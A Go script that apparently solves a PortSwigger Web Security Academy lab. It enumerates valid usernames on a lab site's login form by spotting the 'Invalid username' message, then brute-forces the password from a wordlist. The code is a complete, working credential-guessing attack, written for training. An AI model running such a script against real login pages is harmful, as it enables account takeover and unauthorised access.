// https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0a17006a031cbc2ec06af8680072009f.web-security-academy.net"
	loginUrl := u + "/login"

	username, err := username(loginUrl, client)
	if err != nil {
		return err
	}

	password, err := password(loginUrl, username, client)
	if err != nil {
		return err
	}

	fmt.Println("Username:", username)
	fmt.Println("Password:", password)
	return nil
}

func username(u string, client *http.Client) (string, error) {
	f, err := os.Open("usernames.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		username := sc.Text()
		fmt.Println(username)
		body, err := login(u, username, "123456", client)
		if err != nil {
			return "", err
		}
		if !strings.Contains(body, "Invalid username") {
			return username, nil
		}
	}
	return "", fmt.Errorf("username not found")
}

func password(u, username string, client *http.Client) (string, error) {
	f, err := os.Open("passwords.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	for sc.Scan() {
		password := sc.Text()
		fmt.Println(password)
		body, err := login(u, username, password, client)
		if err != nil {
			return "", err
		}
		if !strings.Contains(body, "Incorrect password") {
			return password, nil
		}
	}
	return "", fmt.Errorf("password not found")
}

var warnRE *regexp.Regexp = regexp.MustCompile(`<p .*is-warning.*>.*</p>`)

func login(u, username, password string, client *http.Client) (string, error) {
	resp, err := client.PostForm(u, url.Values{"username": {username}, "password": {password}})
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode/100 == 4 || resp.StatusCode/100 == 5 {
		return "", fmt.Errorf("%v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}
